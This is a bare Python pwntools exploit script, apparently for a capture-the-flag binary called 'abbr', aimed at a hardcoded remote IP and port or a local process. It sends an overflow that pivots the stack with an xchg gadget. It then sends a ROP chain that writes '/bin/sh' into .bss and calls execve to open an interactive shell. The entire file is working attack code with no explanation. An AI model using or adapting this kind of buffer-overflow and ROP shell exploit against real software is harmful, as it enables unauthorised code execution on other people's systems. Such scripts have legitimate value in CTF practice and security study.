#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./abbr"
#"""
HOST = "168.119.108.148"
PORT = 10010 
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_bss = elf.bss()

xchg_eax_esp = 0x405121
rdi_ret = 0x4018da
rsi_ret = 0x404cfe
rax_ret = 0x45a8f7
rdx_ret = 0x4017df
mov_ptr_rdi_rsi_ret = 0x45684f
syscall = 0x4012e3

def exploit():
	
	payload = b"aaw"
	payload += b"A"*(0xfff-3-3)
	payload += b"\x21\x51\x40"
	conn.sendafter("text: ", payload) 
	
	payload = p64(rdi_ret)
	payload += p64(addr_bss)
	payload += p64(rsi_ret)
	payload += b"/bin/sh\x00"
	payload += p64(mov_ptr_rdi_rsi_ret)
	payload += p64(rsi_ret)
	payload += p64(0)
	payload += p64(rdx_ret)
	payload += p64(0)
	payload += p64(rax_ret)
	payload += p64(59)
	payload += p64(syscall)

	conn.sendlineafter("text: ", payload) 
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
